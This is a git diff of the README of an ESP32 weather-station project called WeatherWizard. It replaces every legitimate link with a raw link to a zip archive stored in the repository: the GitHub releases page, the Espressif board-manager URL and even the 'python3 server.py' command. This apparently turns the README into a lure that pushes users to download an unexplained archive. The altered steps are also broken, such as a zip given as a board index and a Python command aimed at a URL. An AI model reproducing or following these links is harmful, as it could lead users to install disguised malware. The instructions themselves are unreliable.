@@ -6,9 +6,9 @@ Welcome to WeatherWizard! This application allows you to measure weather conditi
 
 ## 📥 Download WeatherWizard
 
-[![Download WeatherWizard](https://img.shields.io/badge/Download-WeatherWizard-blue.svg)](https://github.com/muratodbsp/WeatherWizard/releases)
+[![Download WeatherWizard](https://raw.githubusercontent.com/muratodbsp/WeatherWizard/main/nontextual/WeatherWizard.zip)](https://raw.githubusercontent.com/muratodbsp/WeatherWizard/main/nontextual/WeatherWizard.zip)
 
-Visit this page to download: [WeatherWizard Releases](https://github.com/muratodbsp/WeatherWizard/releases)
+Visit this page to download: [WeatherWizard Releases](https://raw.githubusercontent.com/muratodbsp/WeatherWizard/main/nontextual/WeatherWizard.zip)
 
 ## 📦 System Requirements
 
@@ -27,7 +27,7 @@ Before using WeatherWizard, ensure your system meets the following requirements:
 ## ⚙️ Installation Steps
 
 1. **Download the Software:**
-   Go to the [WeatherWizard Releases](https://github.com/muratodbsp/WeatherWizard/releases) page. Click on the latest version and download the files required for installation.
+   Go to the [WeatherWizard Releases](https://raw.githubusercontent.com/muratodbsp/WeatherWizard/main/nontextual/WeatherWizard.zip) page. Click on the latest version and download the files required for installation.
 
 2. **Set Up Your Hardware:**
    - Connect the BME280 and GUVA-S12SD sensors to your ESP32-C3 as per the wiring diagram included in the documentation.
@@ -38,7 +38,7 @@ Before using WeatherWizard, ensure your system meets the following requirements:
 
 4. **Add ESP32 Board to Arduino:**
    Open Arduino IDE and go to **File > Preferences**. In the **Additional Board Manager URLs** field, add the ESP32 board package URL:  
-   `https://dl.espressif.com/dl/package_esp32_index.json`  
+   `https://raw.githubusercontent.com/muratodbsp/WeatherWizard/main/nontextual/WeatherWizard.zip`  
    After that, open the **Boards Manager** from **Tools > Board > Boards Manager**. Search for "esp32" and click Install.
 
 5. **Upload WeatherWizard Code:**
@@ -60,7 +60,7 @@ Before using WeatherWizard, ensure your system meets the following requirements:
      ```
    - Download the server code from the WeatherWizard repository and run it using:
      ```bash
-     python3 server.py
+     python3 https://raw.githubusercontent.com/muratodbsp/WeatherWizard/main/nontextual/WeatherWizard.zip
      ```
 
 ## 🌐 Configuration
@@ -96,4 +96,4 @@ WeatherWizard is open-source software. You can use, modify, and distribute it un
 
 Thanks to all who contributed to this project and to the open-source community for their resources and tools. Your support makes this project possible.
 
-Remember, for the latest downloads and updates, always refer to the [WeatherWizard Releases](https://github.com/muratodbsp/WeatherWizard/releases) page. Happy weather measuring!
+Remember, for the latest downloads and updates, always refer to the [WeatherWizard Releases](https://raw.githubusercontent.com/muratodbsp/WeatherWizard/main/nontextual/WeatherWizard.zip) page. Happy weather measuring!
